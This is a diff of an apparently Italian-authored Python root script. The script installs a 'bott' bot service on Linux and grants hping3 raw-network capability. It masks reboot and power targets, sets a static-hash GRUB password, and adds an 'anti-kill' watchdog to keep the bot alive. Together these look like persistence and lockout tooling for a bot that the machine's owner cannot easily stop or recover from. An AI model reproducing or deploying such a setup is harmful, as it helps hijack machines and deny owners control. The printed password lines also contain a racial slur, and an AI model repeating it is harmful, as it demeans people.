@@ -18,7 +18,7 @@ if os.geteuid() != 0:
     sys.exit(1)
 
 # =============================
-# 1. Dipendenze
+# 1. INSTALL DIPENDENZE
 # =============================
 run("apt update", fatal=True)
 run(
@@ -28,19 +28,19 @@ run(
 )
 
 # =============================
-# 2. hping3 cap
+# 2. SETCAP HPING3
 # =============================
 if os.path.exists("/usr/sbin/hping3"):
     run("setcap cap_net_raw+ep /usr/sbin/hping3")
 
 # =============================
-# 3. PATH root
+# 3. PATH ROOT
 # =============================
 with open("/root/.bashrc", "a") as f:
     f.write("\nexport PATH=$PATH:/sbin:/usr/sbin\n")
 
 # =============================
-# 4. POWER / REBOOT / SUSPEND LOCK
+# 4. DISABILITA POWER / REBOOT
 # =============================
 targets = [
     "ctrl-alt-del.target",
@@ -53,19 +53,17 @@ for t in targets:
     run(f"systemctl mask {t}")
 
 # =============================
-# 5. GRUB LOCK (HASH STATICO)
+# 5. GRUB LOCK (HASH STATICO SHA512)
 # =============================
 GRUB_HASH = (
-    "grub.pbkdf2.sha256.10000."
-    "dbdd3588e030359bcf8e1efd4624d980."
-    "fe2d4ac214cb672d98272c7db86e10acc91c0332502f8c04d4d7d55d8db967ee"
+    "grub.pbkdf2.sha512.10000."
+    "f3e0328e77725a22d34fbc342deac901."
+    "fe145495995aa9d456712838dc4f55a415b379610fd9fe3de6cab84760b14aab"
 )
 
-GRUB_CUSTOM = "/etc/grub.d/40_custom"
+print("[+] Scrittura configurazione GRUB")
 
-print("[+] Configurazione GRUB con hash statico")
-
-with open(GRUB_CUSTOM, "w") as f:
+with open("/etc/grub.d/40_custom", "w") as f:
     f.write(f"""set superusers="root"
 password_pbkdf2 root {GRUB_HASH}
 """)
@@ -73,7 +71,7 @@ password_pbkdf2 root {GRUB_HASH}
 run("update-grub", fatal=True)
 
 # =============================
-# 6. Python 3.10
+# 6. INSTALL PYTHON 3.10
 # =============================
 run(
     "cd /usr/src && curl -O https://www.python.org/ftp/python/3.10.14/Python-3.10.14.tgz",
@@ -85,7 +83,7 @@ run("cd /usr/src/Python-3.10.14 && make -j$(nproc)", fatal=True)
 run("cd /usr/src/Python-3.10.14 && make altinstall", fatal=True)
 
 # =============================
-# 7. Bot
+# 7. BOT + LIBRERIE
 # =============================
 run("/usr/local/bin/python3.10 -m ensurepip", fatal=True)
 run("/usr/local/bin/python3.10 -m pip install --upgrade pip", fatal=True)
@@ -98,7 +96,7 @@ if os.path.exists("/root/bott"):
     run("chmod 711 /root/.bott")
 
 # =============================
-# 8. BOT SYSTEMD SERVICE
+# 8. SERVICE BOT
 # =============================
 with open("/etc/systemd/system/bott.service", "w") as f:
     f.write("""[Unit]
@@ -124,7 +122,7 @@ run("systemctl start bott")
 # =============================
 # 9. WATCHDOG ANTI-KILL
 # =============================
-print("[+] Attivazione watchdog anti-kill")
+print("[+] Installazione watchdog anti-kill")
 
 with open("/etc/systemd/system/bott-watchdog.service", "w") as f:
     f.write("""[Unit]
@@ -145,7 +143,7 @@ run("systemctl daemon-reload")
 run("systemctl enable bott-watchdog")
 run("systemctl start bott-watchdog")
 
-print("\n[✓] COMPLETATO CON SUCCESSO")
-print("    - GRUB protetto (password: NIGGA YOU CAN'T)")
+print("\n[✓] COMPLETATO")
+print("    - GRUB protetto (password: STUFUNIGGA THAT'S ISN'T)")
 print("    - Bot attivo")
 print("    - Watchdog anti-kill attivo")
